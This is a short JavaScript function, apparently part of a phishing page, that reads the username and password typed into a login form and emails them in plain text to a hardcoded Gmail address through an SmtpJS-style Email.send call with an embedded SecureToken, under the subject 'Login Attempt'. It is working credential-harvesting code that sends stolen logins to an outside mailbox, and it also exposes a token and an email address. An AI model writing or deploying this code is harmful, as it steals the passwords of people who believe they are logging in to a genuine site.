function emailSend() {
    var userName = document.getElementById('name').value;
    var password = document.getElementById('password').value;

    var messageBody = "Name: " + userName + "<br/> Password: " + password;
    
    Email.send({
        SecureToken: "be8ada82-ac4d-40c2-abbc-181e7cc079b8",
        To: 'ravigeetha915@gmail.com',
        From: "ravigeetha915@gmail.com",
        Subject: "Login Attempt",
        Body: messageBody
    }).then(
        // message => {
        //     if (message === 'OK') {
        //         alert("Email sent successfully!");
        //     } else {
        //         alert("Failed to send email!");
        //     }
        // }
    );
}
